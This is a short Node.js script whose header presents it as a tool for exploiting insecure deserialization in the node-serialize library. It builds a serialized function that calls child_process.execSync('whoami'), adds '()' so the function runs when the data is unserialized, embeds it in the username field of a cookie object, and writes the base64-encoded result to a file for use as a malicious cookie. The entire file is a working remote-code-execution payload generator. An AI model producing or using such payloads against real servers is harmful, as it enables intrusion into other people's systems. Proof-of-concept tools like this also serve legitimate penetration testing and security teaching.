// Author: Teerth Sankesara
// github: github.com/tsankesara
// Desc: tool made for exploiting nodejs insecure deserilization of serilized data with Remote Code Execution

const fs = require('fs'); // Import the file system module
var serialize = require('node-serialize');
var y = {rce: function() {return require('child_process').execSync('whoami', function(error, stdout, stderr){console.log(stdout);});}};
var payload_serialized = serialize.serialize(y);
const start = payload_serialized.indexOf('"rce":"') + '"rce":"'.length;
const end = payload_serialized.indexOf('"', start);

// Extract the value string
let valueString = payload_serialized.slice(start, end);
// We add '()' here at the end of the string to make sure that string will call the serilized fucntion, we cannot serilize them togather as
// that just resulst in function being called and not able to serilize.
valueString += '()';
console.log('Final Payload String: ',typeof(valueString), valueString);

var cookie_base = {
    "username": valueString,
    "csrftoken": "u32t4o3tb3gg431fs34ggdgchjwnza0l=", "Expires=": "Friday, 13 Oct 2018 00:00:00 GMT"
}

console.log('JSON: ',JSON.stringify(cookie_base))
var payload_serialized = serialize.serialize(cookie_base);
console.log("Serialized: \n" + payload_serialized);


// Our cookies are Base64
fs.writeFile('base64.txt', btoa(payload_serialized), (err) => {
    if (err) {
      console.error('Error writing to file:', err);
    } else {
      console.log('base64 data has been written to base64.txt');
    }
  });